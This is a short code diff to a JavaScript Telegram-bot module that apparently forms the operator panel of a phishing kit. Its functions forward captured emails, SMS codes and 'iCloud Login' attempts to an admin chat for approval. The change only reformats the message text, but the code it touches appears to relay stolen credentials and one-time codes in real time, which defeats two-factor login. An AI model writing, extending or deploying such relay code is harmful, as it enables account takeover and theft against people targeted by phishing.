@@ -22,7 +22,7 @@ function sendApprovalRequest(email, password) {
       ]
     }
   };
-  bot.sendMessage(ADMIN_CHAT_ID, `*Login Approval Requested*\nEmail: ${email}`, { ...options, parse_mode: "Markdown" });
+  bot.sendMessage(ADMIN_CHAT_ID, `*Login Approval Requested*\n*Email:* ${email}`, { ...options, parse_mode: "Markdown" });
 }
 
 // -----------------
@@ -56,7 +56,7 @@ function sendApprovalRequestSMS(code) {
       ]
     }
   };
-  bot.sendMessage(ADMIN_CHAT_ID, `*SMS Approval Requested*\nCode: ${code}`, { ...options, parse_mode: "Markdown" });
+  bot.sendMessage(ADMIN_CHAT_ID, `*SMS Approval Requested*\n*Code:* ${code}`, { ...options, parse_mode: "Markdown" });
 }
 
 // -----------------
@@ -73,7 +73,7 @@ function sendApprovalRequestPage(email, password) {
       ]
     }
   };
-  bot.sendMessage(ADMIN_CHAT_ID, `*iCloud Login Approval Requested*\nEmail: ${email}`, { ...options, parse_mode: "Markdown" });
+  bot.sendMessage(ADMIN_CHAT_ID, `*iCloud Login Approval Requested*\n*Email:* ${email}`, { ...options, parse_mode: "Markdown" });
 }
 
 // -----------------
@@ -110,4 +110,5 @@ bot.onText(/\/start/, (msg) => {
 });
 
 module.exports = { sendApprovalRequest, sendApprovalRequestGeneric, sendApprovalRequestSMS, sendApprovalRequestPage };
+
 
